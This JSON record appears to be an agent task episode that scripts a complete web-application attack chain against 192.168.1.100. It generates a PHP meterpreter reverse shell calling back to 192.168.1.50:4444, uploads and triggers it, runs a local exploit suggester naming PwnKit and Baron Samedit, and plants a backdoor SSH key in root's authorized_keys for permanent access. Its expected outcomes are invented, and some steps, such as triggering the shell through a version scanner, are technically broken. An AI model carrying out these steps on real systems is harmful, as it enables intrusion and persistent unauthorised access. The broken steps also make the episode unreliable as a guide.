{"episode_id":"PENT_EXPLOIT_METASPLOIT_EP02","title":"Web Application Exploitation with Custom Payloads","description":"Generate custom payload, exploit vulnerable web app, establish persistence","difficulty":"advanced","steps":[{"step_number":1,"instruction":"Generate PHP reverse shell","tool":"msfvenom_payload_generation","parameters":{"payload_type":"php/meterpreter/reverse_tcp","lhost":"192.168.1.50","lport":"4444","format":"raw"},"expected_outcome":"PHP payload generated: 4523 bytes, saved as shell.php"},{"step_number":2,"instruction":"Upload via vulnerable file upload","tool":"msf_auxiliary_scanner_modules","parameters":{"module_path":"auxiliary/scanner/http/upload","rhosts":"192.168.1.100"},"expected_outcome":"File uploaded to /uploads/shell.php"},{"step_number":3,"instruction":"Setup handler for incoming connection","tool":"msfconsole_exploit_module_execution","parameters":{"exploit_path":"exploit/multi/handler","target_ip":"","payload":"php/meterpreter/reverse_tcp"},"expected_outcome":"Handler listening on 192.168.1.50:4444"},{"step_number":4,"instruction":"Trigger payload","tool":"msf_auxiliary_scanner_modules","parameters":{"module_path":"auxiliary/scanner/http/http_version","rhosts":"192.168.1.100/uploads/shell.php"},"expected_outcome":"Meterpreter session 1 opened - www-data shell"},{"step_number":5,"instruction":"Escalate privileges","tool":"msf_post_modules_privilege_escalation","parameters":{"session_id":"1","post_module":"post/multi/recon/local_exploit_suggester"},"expected_outcome":"Suggested exploits: CVE-2021-4034 (PwnKit), CVE-2021-3156 (Sudo Baron Samedit)"},{"step_number":6,"instruction":"Install persistence","tool":"msf_post_modules_privilege_escalation","parameters":{"session_id":"1","post_module":"post/linux/manage/sshkey_persistence"},"expected_outcome":"SSH key installed in /root/.ssh/authorized_keys - permanent access"}],"success_criteria":"Web shell deployed, meterpreter session established, root access via privesc, persistence installed","cleanup":"Backdoor SSH key provides permanent access even if web shell removed"}